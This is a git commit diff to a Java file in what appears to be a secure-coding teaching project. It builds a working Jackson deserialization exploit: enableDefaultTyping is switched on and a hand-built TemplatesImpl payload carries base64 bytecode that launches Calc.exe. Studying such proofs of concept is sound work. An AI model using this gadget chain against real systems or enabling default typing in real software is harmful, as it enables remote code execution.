77e5968d522d81567a094f257283458751915804
rcseacord <rcseacord@gmail.com>
2018-07-05 10:05:04 -0400

    manually write object

--- JavaSCR/src/jackson/Cage.java
+++ JavaSCR/src/jackson/Cage.java
@@ -25,35 +25,108 @@ package jackson;
 import com.fasterxml.jackson.core.JsonProcessingException;
 import com.fasterxml.jackson.databind.ObjectMapper;
 
-import javassist.*;
-
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
+import java.util.LinkedHashMap;
+import java.util.Map;
 import java.util.Properties;
+
+import javassist.CannotCompileException;
+import javassist.NotFoundException;
+import ser05j.Reflections;
+
+import java.util.Base64;
+import java.util.Map.Entry;
 
 public class Cage {
 
   private static String marshal(Object o) throws JsonProcessingException {
     ObjectMapper mapper = new ObjectMapper();
-   // mapper.enableDefaultTyping();
+    mapper.enableDefaultTyping();
     return mapper.writeValueAsString(o);
   }
 
   private static Object unmarshal(String data) throws IOException {
     ObjectMapper mapper = new ObjectMapper();
-  //  mapper.enableDefaultTyping();
+    mapper.enableDefaultTyping();
     return mapper.readValue(data, Object.class);
+  }
+
+  private static String quoteString(String string) {
+    return '"' + string + '"';
+  }
+
+  private static void writeProperty(StringBuilder sb, String key, String value) {
+    sb.append('"').append(key).append('"');
+    sb.append(':');
+    sb.append(value);
+  }
+
+  private static String writeObject(String type, Map<String, String> properties) {
+    StringBuilder sb = new StringBuilder();
+    sb.append('[');
+    sb.append('"').append(type).append('"');
+    sb.append(',');
+    sb.append('{');
+    boolean first = true;
+    for (Entry<String, String> e : properties.entrySet()) {
+      if (!first) {
+        sb.append(',');
+      } else {
+        first = false;
+      }
+      writeProperty(sb, e.getKey(), e.getValue());
+    }
+    sb.append('}');
+    sb.append(']');
+    return sb.toString();
+  }
+
+  private static String writeArray(String... elements) {
+    StringBuilder sb = new StringBuilder();
+    sb.append('[');
+    boolean first = true;
+    for (String elem : elements) {
+      if (!first) {
+        sb.append(',');
+      } else {
+        first = false;
+      }
+      sb.append(elem);
+    }
+    sb.append(']');
+    return sb.toString();
+  }
+
+  public static String rcePayload() throws
+      IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
+      NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
+    String[] args = { "Calc.exe" };
+    Object tpl = TemplatesUtil.createTemplatesImpl(args);
+    byte[][] bytecodes = (byte[][]) Reflections.getFieldValue(tpl, "_bytecodes");
+    Map<String, String> values = new LinkedHashMap<>();
+    String base64 = Base64.getEncoder().encodeToString(bytecodes[0]);
+    values.put("transletBytecodes", writeArray(quoteString(base64)));
+    values.put("transletName", quoteString("foo"));
+    values.put("outputProperties", "{}");
+    if (Boolean.parseBoolean(System.getProperty("upstreamXalan", "false"))) {
+      return writeObject("org.apache.xalan.xsltc.trax.TemplatesImpl", values);
+    }
+    return writeObject("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", values);
   }
 
     public static void main(String[] args) throws
         IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
         NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
     Properties props = System.getProperties();
-    props.setProperty("upstreamXalan", "true");
+    // props.setProperty("upstreamXalan", "true");
 
     String[] command = {"Calc.exe"};
-    Object tpl = TemplatesUtil.createTemplatesImpl(command);
-    Object obj = unmarshal(marshal(tpl));
+    // Object tpl = TemplatesUtil.createTemplatesImpl(command);
+    // Object obj = unmarshal(marshal(tpl))
+    Object obj = unmarshal(rcePayload());
+    Class cls = obj.getClass();
+    System.out.println("The type of the object is: " + cls.getName());
     System.out.println(obj);
   }
 
